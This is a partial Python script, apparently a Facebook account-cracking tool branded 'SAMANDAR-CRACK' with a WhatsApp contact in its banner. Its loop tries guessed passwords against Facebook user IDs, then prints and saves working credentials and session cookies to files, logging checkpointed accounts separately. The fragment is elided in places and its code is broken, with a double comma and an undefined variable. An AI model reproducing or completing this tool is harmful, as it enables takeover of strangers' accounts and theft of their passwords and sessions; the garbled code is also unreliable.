...
\033[1;91m watsapp     : +93 77 121 1599
...
def rndm(ids,mking_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [SAMANDAR-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
response = requests.get('https://mbasic.facebook.com/', cookies=cookies,,headers=head).json()
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [SAMANDARO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
				open('/sdcard/SAMANDARO-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = po['error']['error_data']['uid']
				print('\r\r\x1b[1;33m [SAMANDARO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
				open('/sdcard/SAMANDARO-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			else:continue
		loop+=1
